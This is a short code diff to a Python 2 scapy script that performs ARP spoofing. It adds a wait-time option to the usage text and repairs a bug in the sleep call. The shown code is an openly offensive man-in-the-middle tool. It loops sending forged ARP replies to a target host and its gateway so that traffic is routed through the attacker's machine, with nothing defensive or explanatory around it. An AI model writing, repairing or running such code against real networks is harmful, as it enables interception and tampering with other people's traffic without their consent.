@@ -5,13 +5,13 @@ import sys
 
 
 def main():
-    usage = "Usage: [-i interface] [-t targetip] [-g gatewayip]"
+    usage = "Usage: [-i interface] [-t targetip] [-g gatewayip] [-c ctime]"
     parser = OptionParser(usage)
     parser.add_option('-i', dest='interface',
                       help='select interface(input eth0 or wlan0 or more)')
     parser.add_option('-t', dest='targetip', help='select ip to spoof')
     parser.add_option('-g', dest='gatewayip', help='input gateway ip')
-    parser.add_option('-c', dest='ctime', 
+    parser.add_option('-c', dest='ctime',
                       help='wait time when one arp package sent use seconds')
     (options, args) = parser.parse_args()
     if options.interface and options.targetip and options.gatewayip:
@@ -25,7 +25,7 @@ def main():
         sys.exit(0)
 
 
-def spoof(interface, tip,gip, time):
+def spoof(interface, tip,gip, t):
     local_mac = get_if_hwaddr(interface)
     t_mac = getmacbyip(tip)
     g_mac = getmacbyip(gip)
@@ -37,10 +37,10 @@ def spoof(interface, tip,gip, time):
     try:
         while 1:
             sendp(target_pack,inter=2,iface=interface)
-            time.sleep(time)
+            time.sleep(float(t))
             print "send arp reponse to target(%s),gateway(%s) macaddress is %s" %(tip,gip,local_mac)
             sendp(gateway_pack,inter=2,iface=interface)
-            time.sleep(time)
+            time.sleep(float(t))
             print "send arp reponse to gateway(%s),target(%s) macaddress is %s" %(gip,tip,local_mac)
 
     except KeyboardInterrupt:
